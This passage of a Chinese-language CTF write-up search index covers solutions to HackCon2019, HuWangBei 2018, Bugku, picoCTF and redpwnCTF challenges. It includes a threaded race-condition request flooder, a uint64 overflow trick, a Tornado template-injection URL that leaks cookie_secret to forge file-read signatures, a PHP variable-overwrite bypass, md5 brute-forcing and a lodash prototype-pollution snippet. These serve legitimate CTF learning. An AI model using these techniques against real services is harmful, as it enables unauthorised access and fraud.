join(re.findall(r'\\s+', line)).replace('\\t','1').replace(' ','0') \u6b64\u65f6\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u8fd8\u9700\u8981\u5bf9\u6587\u4ef6\u505a\u4e00\u4e9b\u4fee\u6539 \u4e00\u4e2a\u5e08\u5085\u5199\u7684js\u7248\u672c\uff1a 1 2 3 4 5 6 7 8 9 10 11 function decoder ( str ) { var flag = '' ; str . replace ( /.{7}/g , function ( strByte ) { var binStr = strByte . replace ( / /g , '0' ). replace ( / /g , '1' ); var charCode = parseInt ( binStr , 2 ); result += String . fromCharCode ( charCode ); }); return flag ; }","title":"Invisible Programming"},{"location":"writeup/hackcon2019/#superencryptor-reversing","text":"\u4e0d\u61c2\u56fd\u5916\u7684\u5206\u7c7b\uff1a \u5f97\u5230\u4e00\u4e2aenc\u8fd8\u4ee5\u4e3a\u662f\u6d41\u91cf\u5305\uff0c\u7ed3\u679c\u662f\u4e00\u6bb5\u5b57\u7b26\uff1a 1 d9a68b755a6e7be6aaa912105d749fb8ae33506e4adefeb0745e5c70cfa88c71 \u8fd9\u6837\u7684\u4e00\u4e2a\u7a0b\u5e8f \u8fd8\u662f\u770bwp\u5427 1 2 3 4 5 6 7 8 9 echo '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' | ./q3 _ _ __ __ _ _ __ _____ __ | \\ | | | \\/ (_) | \\ \\ / / _ \\/_ | | \\| | __ _ _ __ ___ | \\ / |_| |_ ___ ___ \\ \\ / / | | || | | . ` |/ _` | '_ \\ / _ \\| |\\/| | | __/ _ \\/ __| \\ \\/ /| | | || | | |\\ | (_| | | | | (_) | | | | | || __/\\__ \\ \\ / | |_| || | |_| \\_|\\__,_|_| |_|\\___/|_| |_|_|\\__\\___||___/ \\/ \\___(_)_| String to encrypt (Max 5000) : Encrypted : abcdef4123310abcdef4123310ab \u7136\u540e\u5c31\u83ab\u540d\u7684\u8ba4\u4e3a\u8fd9\u4e2a\u662f\u4ea6\u6216\u8fd0\u7b97\uff1f\uff1f\u4e0d\u8fc7\u4ed6\u8fd9\u662f\u600e\u4e48\u60f3\u51fa\u6765\u7684\u554a First thought that came to my mind was that it was an XOR operation with the key abcdef4123310 . When I XORed this key with the content of flag.enc, I got: 1 rkd4y_{MgFS3lt4uArs_Ju3_5}mpdec0 which looks like the shuffled version of the flag. Swapped two sides inside each 4-byte block, and got the flag: 1 d4rk{My_S3gF4ults_Ar3_Jump5}c0de \u8fd9\u6837\u5c31\u5f97\u5230flag\u4e86","title":"SuperEncryptor | Reversing"},{"location":"writeup/hackcon2019/#gife_me_time-forensics","text":"\u8fd9\u4e2a\u7c7b\u522b\u7684\u9898\u76ee\u4e5f\u662f\u7b2c\u4e00\u6b21\u89c1 \u8bbf\u95ee\u4e86\u8fd9\u6837\u4e00\u4e2a\u9875\u9762","title":"GIFe_me_time | Forensics"},{"location":"writeup/hackcon2019/#_1","text":"https://medium.com/@Nicholaz99/hackcon2019-writeup-4639553b9355 https://ctftime.org/writeups https://hackcon.online/challenges#GIMP IT Github Invisible Programming","title":"\u53c2\u8003"},{"location":"writeup/hwb2018/","text":"\u62a4\u7f51\u676f \u00b6 LTSHOP | Web \u00b6 \u591a\u7ebf\u7a0b\u53d1\u5305\u8d2d\u4e70\u8fa3\u6761 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import requests import threading url = \"http://49.4.79.236:30189/\" s = requests . Session () def post ( querystring ): headers = { 'Cookie' : \"go_iris_cookie=93542bfe-f8e2-4e4e-ba4c-1b0c5c739342;\" , 'Content-Type' : \"application/x-www-form-urlencoded\" } response = s . post ( url + querystring , headers = headers ) print ( response . text ) def main (): l = [] for i in range ( 1000 ): l . append ( threading . Thread ( target = post , args = ( 'buylt' ,))) # \u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u7684\u5217\u8868\uff0c\u540c\u65f6\u4f20\u5165\u53c2\u6570 for t in l : t . start () for t in l : t . join () if __name__ == '__main__' : main () \u8bb0\u5f55\u4e00\u4e0bpython threading \u5e93\u7684\u7528\u6cd5\uff0c\u4f46\u662f\u89c9\u5f97\u6ca1\u5fc5\u8981\u5b8c\u6574\u5730\u5b66\u4e60\u591a\u7ebf\u7a0b\u904d\u7a0b\uff0c\u6309\u7167\u8fd9\u4e2a\u6a21\u677f\u8d70\u5c31\u597d \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8d85\u8fc7 5 \u4e2a\u4ee5\u4e0a\u7684\u5927\u8fa3\u6761\uff0c\u4f46\u8fdc\u8fdc\u4e70\u4e0d\u5230\u8db3\u591f\u7684\u8fa3\u6761\u4e4b\u738b \u6b64\u65f6\u6211\u4eec\u89c2\u5bdf\u5230\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u6279\u91cf\u8d2d\u4e70\u7684\u6570\u91cf\uff0c\u4e0d\u540c\u6570\u91cf\u7684\u53cd\u9988\u662f\u4e0d\u540c\u7684\uff0c\u6bd4\u5982\u6211\u8d2d\u4e70 2 \u4e2a\uff0c\u63d0\u9192\u7684\u662f\u5927\u8fa3\u6761\u6570\u91cf\u4e0d\u8db3\uff0c\u800c\u8d2d\u4e70 -1 \u4e2a\u6216\u8005 99999999999999999999 \u5219\u662f\u6570\u91cf\u975e\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u731c\u6d4b\u9898\u76ee\u4f7f\u7528 uint64 \u4f5c\u4e3a\u53d8\u91cf\u7684\u7c7b\u578b\u3002 \u53ef\u4ee5\u63a8\u6d4b\u9898\u76ee\u7684\u903b\u8f91\u5982\u4e0b\uff1a 1 2 3 4 var num uint if num * 5 <= \u5927\u8fa3\u6761\u6570\u76ee { \u8fa3\u6761\u4e4b\u738b += num } \u5f88\u660e\u663e\u5b58\u5728\u7740\u4e58\u6cd5\u4e0a\u6ea2\u95ee\u9898\uff0c\u5982\u679c\u6211\u4eec\u6784\u9020 num = 3689348814741910324 \uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u53ef\u5f97 num * 5 = 4 \uff0c 4 <= 5 \u6210\u7acb 1 2 i = 2**64 // 5 + 1 # 3689348814741910324 j = i * 5 % 2 ** 64 # 4 \u6240\u4ee5\u6211\u4eec\u5373\u53ef\u5229\u7528 4 \u4e2a\u5927\u8fa3\u6761\u4e70\u5230\u8fd1\u4e4e\u65e0\u9650\u7684\u8fa3\u6761\u4e4b\u738b\uff08\u5177\u4f53\u4e3a 3689348814741910324 \u4e2a\uff09\uff0c\u5373\u53ef\u987a\u5229\u8d2d\u4e70 flag \u603b\u7ed3 \u00b6 go\u8bed\u8a00unit64\u6ea2\u51fa\u5f88\u5e38\u89c1\u4e86 easy tornado | Web \u00b6 \u8fdb\u5165\u9898\u76ee 1 http://49.4.78.81:30980/ \u53d1\u73b0\u610f\u601d\u5f88\u660e\u786e\uff0c\u6709\u7b7e\u540d\uff0c\u8bfb\u6587\u4ef6 \u53d1\u73b0 1 http://49.4.78.81:30980/error?msg={{1^0}} \u53ef\u6a21\u677f\u6ce8\u5165\uff0c\u4f46\u8fc7\u6ee4\u4e86\u975e\u5e38\u591a\u7684\u7b26\u53f7\uff0c\u5e94\u8be5\u53ea\u80fd\u8bfb\u4e2a\u53d8\u91cf \u53d1\u73b0 handler.settings \u5b58\u653e\u4e86cookie_secret \u8fd9\u4e2a\u662ftornado\u7684\u4e00\u4e2a\u7279\u6027\u4e86\uff0c\u8bb0\u4e0b\u6765\u5427 \u8bfb\u53d6 1 http://49.4.78.81:30980/error?msg={{handler.settings}} \u5f97\u5230\uff1a 1 \u968f\u673a\u6784\u9020\u7b7e\u540d\u8bfbflag 1 http://49.4.78.81:30980/file?filename=/fllllllllllag&signature=7bae09c2c6e2f6aa34df7dbee23db960 \u5f97\u5230 1 flag{67a3d3dec827645c1c92d1f2160c744f} easypython | Web \u00b6 \u53ef\u4ee5\u63a2\u6d4b\u5230\u5185\u7f51\u768480\u7aef\u53e3\uff1f \u53c2\u8003 \u00b6 \u62a4\u7f51\u676f2018wp","title":"\u62a4\u7f51\u676f"},{"location":"writeup/hwb2018/#_1","text":"","title":"\u62a4\u7f51\u676f"},{"location":"writeup/hwb2018/#ltshop-web","text":"\u591a\u7ebf\u7a0b\u53d1\u5305\u8d2d\u4e70\u8fa3\u6761 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import requests import threading url = \"http://49.4.79.236:30189/\" s = requests . Session () def post ( querystring ): headers = { 'Cookie' : \"go_iris_cookie=93542bfe-f8e2-4e4e-ba4c-1b0c5c739342;\" , 'Content-Type' : \"application/x-www-form-urlencoded\" } response = s . post ( url + querystring , headers = headers ) print ( response . text ) def main (): l = [] for i in range ( 1000 ): l . append ( threading . Thread ( target = post , args = ( 'buylt' ,))) # \u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u7684\u5217\u8868\uff0c\u540c\u65f6\u4f20\u5165\u53c2\u6570 for t in l : t . start () for t in l : t . join () if __name__ == '__main__' : main () \u8bb0\u5f55\u4e00\u4e0bpython threading \u5e93\u7684\u7528\u6cd5\uff0c\u4f46\u662f\u89c9\u5f97\u6ca1\u5fc5\u8981\u5b8c\u6574\u5730\u5b66\u4e60\u591a\u7ebf\u7a0b\u904d\u7a0b\uff0c\u6309\u7167\u8fd9\u4e2a\u6a21\u677f\u8d70\u5c31\u597d \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8d85\u8fc7 5 \u4e2a\u4ee5\u4e0a\u7684\u5927\u8fa3\u6761\uff0c\u4f46\u8fdc\u8fdc\u4e70\u4e0d\u5230\u8db3\u591f\u7684\u8fa3\u6761\u4e4b\u738b \u6b64\u65f6\u6211\u4eec\u89c2\u5bdf\u5230\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u6279\u91cf\u8d2d\u4e70\u7684\u6570\u91cf\uff0c\u4e0d\u540c\u6570\u91cf\u7684\u53cd\u9988\u662f\u4e0d\u540c\u7684\uff0c\u6bd4\u5982\u6211\u8d2d\u4e70 2 \u4e2a\uff0c\u63d0\u9192\u7684\u662f\u5927\u8fa3\u6761\u6570\u91cf\u4e0d\u8db3\uff0c\u800c\u8d2d\u4e70 -1 \u4e2a\u6216\u8005 99999999999999999999 \u5219\u662f\u6570\u91cf\u975e\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u731c\u6d4b\u9898\u76ee\u4f7f\u7528 uint64 \u4f5c\u4e3a\u53d8\u91cf\u7684\u7c7b\u578b\u3002 \u53ef\u4ee5\u63a8\u6d4b\u9898\u76ee\u7684\u903b\u8f91\u5982\u4e0b\uff1a 1 2 3 4 var num uint if num * 5 <= \u5927\u8fa3\u6761\u6570\u76ee { \u8fa3\u6761\u4e4b\u738b += num } \u5f88\u660e\u663e\u5b58\u5728\u7740\u4e58\u6cd5\u4e0a\u6ea2\u95ee\u9898\uff0c\u5982\u679c\u6211\u4eec\u6784\u9020 num = 3689348814741910324 \uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u53ef\u5f97 num * 5 = 4 \uff0c 4 <= 5 \u6210\u7acb 1 2 i = 2**64 // 5 + 1 # 3689348814741910324 j = i * 5 % 2 ** 64 # 4 \u6240\u4ee5\u6211\u4eec\u5373\u53ef\u5229\u7528 4 \u4e2a\u5927\u8fa3\u6761\u4e70\u5230\u8fd1\u4e4e\u65e0\u9650\u7684\u8fa3\u6761\u4e4b\u738b\uff08\u5177\u4f53\u4e3a 3689348814741910324 \u4e2a\uff09\uff0c\u5373\u53ef\u987a\u5229\u8d2d\u4e70 flag","title":"LTSHOP | Web"},{"location":"writeup/hwb2018/#_2","text":"go\u8bed\u8a00unit64\u6ea2\u51fa\u5f88\u5e38\u89c1\u4e86","title":"\u603b\u7ed3"},{"location":"writeup/hwb2018/#easy-tornado-web","text":"\u8fdb\u5165\u9898\u76ee 1 http://49.4.78.81:30980/ \u53d1\u73b0\u610f\u601d\u5f88\u660e\u786e\uff0c\u6709\u7b7e\u540d\uff0c\u8bfb\u6587\u4ef6 \u53d1\u73b0 1 http://49.4.78.81:30980/error?msg={{1^0}} \u53ef\u6a21\u677f\u6ce8\u5165\uff0c\u4f46\u8fc7\u6ee4\u4e86\u975e\u5e38\u591a\u7684\u7b26\u53f7\uff0c\u5e94\u8be5\u53ea\u80fd\u8bfb\u4e2a\u53d8\u91cf \u53d1\u73b0 handler.settings \u5b58\u653e\u4e86cookie_secret \u8fd9\u4e2a\u662ftornado\u7684\u4e00\u4e2a\u7279\u6027\u4e86\uff0c\u8bb0\u4e0b\u6765\u5427 \u8bfb\u53d6 1 http://49.4.78.81:30980/error?msg={{handler.settings}} \u5f97\u5230\uff1a 1 \u968f\u673a\u6784\u9020\u7b7e\u540d\u8bfbflag 1 http://49.4.78.81:30980/file?filename=/fllllllllllag&signature=7bae09c2c6e2f6aa34df7dbee23db960 \u5f97\u5230 1 flag{67a3d3dec827645c1c92d1f2160c744f}","title":"easy tornado | Web"},{"location":"writeup/hwb2018/#easypython-web","text":"\u53ef\u4ee5\u63a2\u6d4b\u5230\u5185\u7f51\u768480\u7aef\u53e3\uff1f","title":"easypython | Web"},{"location":"writeup/hwb2018/#_3","text":"\u62a4\u7f51\u676f2018wp","title":"\u53c2\u8003"},{"location":"writeup/liveoverflow/","text":"liveoverflow \u00b6 reverse \u00b6 \u7a0b\u5e8f\u7684\u4e3b\u8981\u903b\u8f91 \u53ef\u4ee5\u770b\u5230\u6bcf\u6b21\u662f\u53d6\u51fa\u4e00\u4e2a\u5b57\u8282 and eax, 0xff \u4ece\u5de6\u5f80\u53f3\uff0c\u5148\u4e0e 0x65 \u6bd4\u8f83\uff0c\u7b2c\u4e8c\u4e2a\u5148\u53f3\u79fb 0x10 \u7136\u540e test eax,eax \u90a3\u5c31\u610f\u5473\u7740\u662f00\u4e4b\u540e\u5206\u6790\u4e00\u4e0b\u5c31\u5f97\u51fa\u4e86\u7ed3\u8bba\u662f 0xb16b00b5","title":"liveoverflow"},{"location":"writeup/liveoverflow/#liveoverflow","text":"","title":"liveoverflow"},{"location":"writeup/liveoverflow/#reverse","text":"\u7a0b\u5e8f\u7684\u4e3b\u8981\u903b\u8f91 \u53ef\u4ee5\u770b\u5230\u6bcf\u6b21\u662f\u53d6\u51fa\u4e00\u4e2a\u5b57\u8282 and eax, 0xff \u4ece\u5de6\u5f80\u53f3\uff0c\u5148\u4e0e 0x65 \u6bd4\u8f83\uff0c\u7b2c\u4e8c\u4e2a\u5148\u53f3\u79fb 0x10 \u7136\u540e test eax,eax \u90a3\u5c31\u610f\u5473\u7740\u662f00\u4e4b\u540e\u5206\u6790\u4e00\u4e0b\u5c31\u5f97\u51fa\u4e86\u7ed3\u8bba\u662f 0xb16b00b5","title":"reverse"},{"location":"writeup/new-bugku/","text":"newBugku \u00b6 \u8bb0\u5f55\u4e00\u4e0bnewBugku\u7684\u9898\u89e3 web26 \u00b6 \u5229\u7528 and \u8fd9\u4e2a\u5c0ftrick Web1 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php error_reporting ( 0 ); include 'flag.php' ; $b = 'ssAEDsssss' ; extract ( $_GET ); if ( isset ( $a )){ $c = trim ( file_get_contents ( $b )); if ( $a == $c ){ echo $myFlag ; } else { } } \u53d8\u91cf\u8986\u76d6\u52a0\u4f2a\u534f\u8bae\u7ed5\u8fc7 \u4f46\u662f\u59ff\u52bf\u4e0d\u6b63\u786e\u662f\u51e0\u4e2a\u610f\u601d\uff1f\uff1f\uff1f md5\u662f\u53ef\u4ee5\u6210\u529f\u89e3\u5bc6\u7684\u4f46\u662f\u3002\u8fd8\u662f\u59ff\u52bf\u4e0d\u6b63\u786e \u4e0d\u662f\u5f88\u7406\u89e3\u8fd9\u4e2a\u505a\u6cd5\uff1a \u4e00\u4e2a\u7f51\u7ad9 web9 \u00b6 \u6839\u636e\u9898\u76ee\u63d0\u793a PUT \u8054\u60f3\u5230PUT\u534f\u8bae\uff0c\u5c1d\u8bd5\u4f7f\u7528 curl \u63d0\u4ea4\u5374\u5931\u8d25\u4e86\uff1f\uff1f web6 \u00b6 \u4fee\u6539HTTP\u5934\uff0c\u8fd9\u6b21IP\u6ca1\u6709\u88ab\u7981\u6b62\u4e86 \u67e5\u770b\u6e90\u4ee3\u7801\u624d\u53d1\u73b0\u6709\u4e00\u4e2a\u6ce8\u91ca\uff1a <!-- dGVzdDEyMw== -->% base64\u89e3\u7801\u4e4b\u540e\u662f test123 \u662f\u7528\u6237\u540d\u8fd8\u662f\u5bc6\u7801\u5462\uff1f\u7206\u7834\u8bd5\u4e00\u4e0b \u76f4\u63a5\u7528\u6237\u540d admin \u5bc6\u7801 test123 \u5c1d\u8bd5\u6210\u529f \u4f46\u662f\u63d0\u4ea4\u7684\u65f6\u5019\u59ff\u52bf\u4e0d\u5bf9 \u7136\u800c\u63d0\u4ea4\u8fd8\u662f\u59ff\u52bf\u4e0d\u5bf9 md5\u89e3\u5bc6\u7f51\u7ad9 \u5934\u50cf \u00b6 \u5f97\u5230\u4e00\u5f20\u56fe\u7247 \u56fe\u7247\u4e0a\u7684\u5b57\u662f milk chocolate \u725b\u5976\u5de7\u514b\u529b\uff1f\uff1f binwalk\u5206\u6790\uff1a binwalk \u89c9\u5f97\u91cc\u9762\u6709\u4e00\u4e2a TIFF \u56fe\u50cf \u7136\u800c zsteg \u5de5\u5177\u4e0d\u652f\u6301 \u7a81\u7136\u53d1\u73b0\u4e0b\u8f7d\u7684\u56fe\u7247\u540e\u7f00\u662fpng\u7684\u4f46\u662f\u5b9e\u9645\u4e0a\u786e\u5b9ejpg\u683c\u5f0f\u7684 \u662f\u5426\u6697\u793a\u4e86\u4ec0\u4e48\u5462\uff1f\uff1f dd \u547d\u4ee4\u662f\u8981\u5b66\u4e60\u4e00\u4e0b\u4e86 binwalk \u786e\u5b9e\u6ca1\u9519\u662f\u53ef\u4ee5\u63d0\u53d6\u51fa\u6765\u7684\uff0c\u4e0d\u8fc7\u8981\u81ea\u5df1\u624b\u52a8\u7528 dd \u547d\u4ee4 \u7136\u540e strings \u4e00\u4e0b\u5c31\u884c\u4e86 \u5176\u5b9e\u4e00\u5f00\u59cb\u5c31\u53ef\u4ee5strings\u7684\u3002\u53ea\u662f\u81ea\u5df1\u4e00\u65f6\u6ca1\u6709\u53d1\u73b0 \u7136\u540e\u6211\u4eec\u9700\u8981base64\u89e3\u7801\u518dmd5\u52a0\u5bc6\u5f97\u5230\u6700\u7ec8\u7684flag\u3002\u3002\u3002 \u8bba\u575b\u4e2d\u7684\u4e00\u9053web \u00b6 \u94fe\u63a5 \u767b\u9646\u754c\u9762\uff0c\u5bc6\u7801\u5904\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u65e0\u7f18\u65e0\u6545\u7684\u586b\u5145\u4e86Password \u6362\u4e2a\u6d4f\u89c8\u5668\u4e5f\u662f\u7684 \u6293\u5305\u7684\u65f6\u5019\u53d1\u73b0: \u5728\u63d0\u4ea4\u5b8c\u8868\u5355\u4e4b\u540e\u8fde\u7eed\u53d1\u9001\u4e86\u56db\u4e2a\u8bf7\u6c42\uff0c\u800c\u4e14\u76f8\u5e94\u90fd\u662f404. \u6e90\u4ee3\u7801\u4e2d\u6709\u8fd9\u6837\u7684\uff0c\u6240\u4ee5\u4e0d\u586b\u7684\u65f6\u5019\u9ed8\u8ba4\u662fUsername\u548cPassword \u8fdb\u5236\u8f6c\u6362 \u00b6 \u731c\u5230\u662f4\u8fdb\u5236\uff0c\u8bd5\u4e00\u4e0b\u6210\u529f\u4e86 1 2 3 4 5 6 7 a = '1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331' b = a . split ( ' ' ) res = [] for i in b : res . append ( int ( i , 4 )) for i in res : print ( chr ( i ), end = '' ) web2 \u00b6 \u5199\u811a\u672c 1 2 3 4 5 6 7 8 import requests from bs4 import BeautifulSoup sess = requests . session () res = sess . get ( 'http://123.206.31.85:10002/' ) res_beauty = BeautifulSoup ( res . text ) result = eval ( res_beauty . p . contents [ 2 ][ 1 :]) res1 = sess . post ( 'http://123.206.31.85:10002/' , data = { 'result' : result }) print ( res1 . text ) \u8fd8\u662f\u8981\u5f00\u4e00\u4e2asession\u624d\u5bf9 web11 \u00b6 \u626b\u63cf\u5230\u5982\u4e0b\u6587\u4ef6\u4e4b\u540e\u8bbf\u95eeshell.php md5\u7206\u7834 1 2 3 4 5 6 7 8 9 10 11 12 13 import random import string def md5 ( str ): import hashlib m = hashlib . md5 () m . update ( str ) return m . hexdigest () while 1 : string = '' s = string . join ( random . sample ( 'qwertyuiopasdfghjklzxcvbnm1234567890' , 4 )) if md5 ( s . encode ( 'utf-8' ))[ 0 : 6 ] == '447e2a' : ----> \u6539\u6210\u8981\u7206\u7834\u7684 print ( s ) break \u53c2\u8003 \u00b6","title":"newBugku"},{"location":"writeup/new-bugku/#newbugku","text":"\u8bb0\u5f55\u4e00\u4e0bnewBugku\u7684\u9898\u89e3","title":"newBugku"},{"location":"writeup/new-bugku/#web26","text":"\u5229\u7528 and \u8fd9\u4e2a\u5c0ftrick","title":"web26"},{"location":"writeup/new-bugku/#web1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php error_reporting ( 0 ); include 'flag.php' ; $b = 'ssAEDsssss' ; extract ( $_GET ); if ( isset ( $a )){ $c = trim ( file_get_contents ( $b )); if ( $a == $c ){ echo $myFlag ; } else { } } \u53d8\u91cf\u8986\u76d6\u52a0\u4f2a\u534f\u8bae\u7ed5\u8fc7 \u4f46\u662f\u59ff\u52bf\u4e0d\u6b63\u786e\u662f\u51e0\u4e2a\u610f\u601d\uff1f\uff1f\uff1f md5\u662f\u53ef\u4ee5\u6210\u529f\u89e3\u5bc6\u7684\u4f46\u662f\u3002\u8fd8\u662f\u59ff\u52bf\u4e0d\u6b63\u786e \u4e0d\u662f\u5f88\u7406\u89e3\u8fd9\u4e2a\u505a\u6cd5\uff1a \u4e00\u4e2a\u7f51\u7ad9","title":"Web1"},{"location":"writeup/new-bugku/#web9","text":"\u6839\u636e\u9898\u76ee\u63d0\u793a PUT \u8054\u60f3\u5230PUT\u534f\u8bae\uff0c\u5c1d\u8bd5\u4f7f\u7528 curl \u63d0\u4ea4\u5374\u5931\u8d25\u4e86\uff1f\uff1f","title":"web9"},{"location":"writeup/new-bugku/#web6","text":"\u4fee\u6539HTTP\u5934\uff0c\u8fd9\u6b21IP\u6ca1\u6709\u88ab\u7981\u6b62\u4e86 \u67e5\u770b\u6e90\u4ee3\u7801\u624d\u53d1\u73b0\u6709\u4e00\u4e2a\u6ce8\u91ca\uff1a <!-- dGVzdDEyMw== -->% base64\u89e3\u7801\u4e4b\u540e\u662f test123 \u662f\u7528\u6237\u540d\u8fd8\u662f\u5bc6\u7801\u5462\uff1f\u7206\u7834\u8bd5\u4e00\u4e0b \u76f4\u63a5\u7528\u6237\u540d admin \u5bc6\u7801 test123 \u5c1d\u8bd5\u6210\u529f \u4f46\u662f\u63d0\u4ea4\u7684\u65f6\u5019\u59ff\u52bf\u4e0d\u5bf9 \u7136\u800c\u63d0\u4ea4\u8fd8\u662f\u59ff\u52bf\u4e0d\u5bf9 md5\u89e3\u5bc6\u7f51\u7ad9","title":"web6"},{"location":"writeup/new-bugku/#_1","text":"\u5f97\u5230\u4e00\u5f20\u56fe\u7247 \u56fe\u7247\u4e0a\u7684\u5b57\u662f milk chocolate \u725b\u5976\u5de7\u514b\u529b\uff1f\uff1f binwalk\u5206\u6790\uff1a binwalk \u89c9\u5f97\u91cc\u9762\u6709\u4e00\u4e2a TIFF \u56fe\u50cf \u7136\u800c zsteg \u5de5\u5177\u4e0d\u652f\u6301 \u7a81\u7136\u53d1\u73b0\u4e0b\u8f7d\u7684\u56fe\u7247\u540e\u7f00\u662fpng\u7684\u4f46\u662f\u5b9e\u9645\u4e0a\u786e\u5b9ejpg\u683c\u5f0f\u7684 \u662f\u5426\u6697\u793a\u4e86\u4ec0\u4e48\u5462\uff1f\uff1f dd \u547d\u4ee4\u662f\u8981\u5b66\u4e60\u4e00\u4e0b\u4e86 binwalk \u786e\u5b9e\u6ca1\u9519\u662f\u53ef\u4ee5\u63d0\u53d6\u51fa\u6765\u7684\uff0c\u4e0d\u8fc7\u8981\u81ea\u5df1\u624b\u52a8\u7528 dd \u547d\u4ee4 \u7136\u540e strings \u4e00\u4e0b\u5c31\u884c\u4e86 \u5176\u5b9e\u4e00\u5f00\u59cb\u5c31\u53ef\u4ee5strings\u7684\u3002\u53ea\u662f\u81ea\u5df1\u4e00\u65f6\u6ca1\u6709\u53d1\u73b0 \u7136\u540e\u6211\u4eec\u9700\u8981base64\u89e3\u7801\u518dmd5\u52a0\u5bc6\u5f97\u5230\u6700\u7ec8\u7684flag\u3002\u3002\u3002","title":"\u5934\u50cf"},{"location":"writeup/new-bugku/#web","text":"\u94fe\u63a5 \u767b\u9646\u754c\u9762\uff0c\u5bc6\u7801\u5904\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u65e0\u7f18\u65e0\u6545\u7684\u586b\u5145\u4e86Password \u6362\u4e2a\u6d4f\u89c8\u5668\u4e5f\u662f\u7684 \u6293\u5305\u7684\u65f6\u5019\u53d1\u73b0: \u5728\u63d0\u4ea4\u5b8c\u8868\u5355\u4e4b\u540e\u8fde\u7eed\u53d1\u9001\u4e86\u56db\u4e2a\u8bf7\u6c42\uff0c\u800c\u4e14\u76f8\u5e94\u90fd\u662f404. \u6e90\u4ee3\u7801\u4e2d\u6709\u8fd9\u6837\u7684\uff0c\u6240\u4ee5\u4e0d\u586b\u7684\u65f6\u5019\u9ed8\u8ba4\u662fUsername\u548cPassword","title":"\u8bba\u575b\u4e2d\u7684\u4e00\u9053web"},{"location":"writeup/new-bugku/#_2","text":"\u731c\u5230\u662f4\u8fdb\u5236\uff0c\u8bd5\u4e00\u4e0b\u6210\u529f\u4e86 1 2 3 4 5 6 7 a = '1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331' b = a . split ( ' ' ) res = [] for i in b : res . append ( int ( i , 4 )) for i in res : print ( chr ( i ), end = '' )","title":"\u8fdb\u5236\u8f6c\u6362"},{"location":"writeup/new-bugku/#web2","text":"\u5199\u811a\u672c 1 2 3 4 5 6 7 8 import requests from bs4 import BeautifulSoup sess = requests . session () res = sess . get ( 'http://123.206.31.85:10002/' ) res_beauty = BeautifulSoup ( res . text ) result = eval ( res_beauty . p . contents [ 2 ][ 1 :]) res1 = sess . post ( 'http://123.206.31.85:10002/' , data = { 'result' : result }) print ( res1 . text ) \u8fd8\u662f\u8981\u5f00\u4e00\u4e2asession\u624d\u5bf9","title":"web2"},{"location":"writeup/new-bugku/#web11","text":"\u626b\u63cf\u5230\u5982\u4e0b\u6587\u4ef6\u4e4b\u540e\u8bbf\u95eeshell.php md5\u7206\u7834 1 2 3 4 5 6 7 8 9 10 11 12 13 import random import string def md5 ( str ): import hashlib m = hashlib . md5 () m . update ( str ) return m . hexdigest () while 1 : string = '' s = string . join ( random . sample ( 'qwertyuiopasdfghjklzxcvbnm1234567890' , 4 )) if md5 ( s . encode ( 'utf-8' ))[ 0 : 6 ] == '447e2a' : ----> \u6539\u6210\u8981\u7206\u7834\u7684 print ( s ) break","title":"web11"},{"location":"writeup/new-bugku/#_3","text":"","title":"\u53c2\u8003"},{"location":"writeup/picoCTF2019/","text":"picoCTF2019 \u00b6 Empire1 \u00b6 \u662f\u4e00\u4e2aflask\u5e94\u7528\uff0c\u53ef\u4ee5\u6dfb\u52a0\u4ee3\u529e\u4e8b\u9879\uff0c\u53ef\u4ee5\u67e5\u770b\u5176\u4ed6\u4eba\u7684\u4fe1\u606f \u5c1d\u8bd5SSTI\u4f46\u662f\u6ca1\u6210\u529f \u770b\u63d0\u793a\u611f\u89c9\u548c\u6570\u636e\u5e93\u6709\u5f88\u5927\u7684\u5173\u7cfb\u3002\u3002","title":"picoCTF2019"},{"location":"writeup/picoCTF2019/#picoctf2019","text":"","title":"picoCTF2019"},{"location":"writeup/picoCTF2019/#empire1","text":"\u662f\u4e00\u4e2aflask\u5e94\u7528\uff0c\u53ef\u4ee5\u6dfb\u52a0\u4ee3\u529e\u4e8b\u9879\uff0c\u53ef\u4ee5\u67e5\u770b\u5176\u4ed6\u4eba\u7684\u4fe1\u606f \u5c1d\u8bd5SSTI\u4f46\u662f\u6ca1\u6210\u529f \u770b\u63d0\u793a\u611f\u89c9\u548c\u6570\u636e\u5e93\u6709\u5f88\u5927\u7684\u5173\u7cfb\u3002\u3002","title":"Empire1"},{"location":"writeup/redpwnctf2019/","text":"redpwnctf2019 \u00b6 \u6f0f\u6d1e\u70b9\u5206\u6790 \u00b6 1 2 3 4 5 6 7 8 9 10 try { // default values are easier to do than proper input validation const mergeObj = {} mergeObj . constructor = { prototype : user . bpProto } mergeObj . __proto__ = user . bpProto parsedBody = _ . defaultsDeep ( mergeObj , JSON . parse ( body )) } catch ( e ) { res . end ( 'bad json' ) return } \u7b97\u662f\u4eca\u5e74\u521a\u521a\u7206\u51fa\u7684\u4e00\u4e2a\u6f0f\u6d1e\u4e86\uff0c\u5176\u5b9ejs\u7684\u5f88\u591a\u5e93\u90fd\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898 